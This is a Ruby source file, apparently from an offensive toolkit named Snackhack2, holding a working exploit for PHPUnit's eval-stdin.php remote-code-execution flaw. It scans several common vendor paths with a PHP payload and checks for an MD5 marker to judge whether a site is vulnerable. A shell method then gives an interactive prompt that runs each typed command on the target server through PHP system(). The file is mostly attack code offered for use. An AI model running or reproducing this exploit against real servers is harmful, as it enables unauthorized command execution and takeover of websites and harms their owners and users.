# frozen_string_literal: true
require 'net/http'
require 'uri'
module Snackhack2
  class Test
    attr_accessor :ip

    def initialize(site, payload: "<?php echo md5('phpunit_rce'); ?>")
      @site = site
      @payload = payload
    end

    def run(shell: false)
      paths = ["vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]
      paths.each do |path|
      
        uri = URI.parse(File.join(@site, path))
        request = Net::HTTP::Post.new(uri)
        request.body = "#{@payload}"

        req_options = {
          use_ssl: uri.scheme == "https",
        }

        response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
          http.request(request)
        end
        # this is the MD5 Hhash of "phpunit_rce"
        if response.body.match("6dd70f16549456495373a337e6708865")
          if shell.eql?(false)
            puts "the site is vulnerable!"
          else
            # YES going to use shell
            # returns the path so that the shell 
            # can access the site.

            # its set as true bc its vulnerable
            return [true, path]
          end
        else
          puts "The site is not vulnerable...."
        end
      end
    end
    def shell
      #  we are using the shell so its true
      r_shell = run(shell: true)
      # makes sure the site is vulnerable if it 
      # is it will run a endless while loop
      if r_shell[0]
        while true
            # takes input to run on the server
          
            print(">")
            input = gets.chomp
            if input.eql?("exit")
              exit
            else
              uri = URI.parse(File.join(@site, r_shell[1]))
              request = Net::HTTP::Post.new(uri)
              # takes the input ad run it on the host
              request.body = "<?php system('#{input}'); ?>"

              req_options = {
                use_ssl: uri.scheme == "https",
              }

              response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
                http.request(request)
              end
              puts response.body
            end
        end
      end 
    end
  end
end
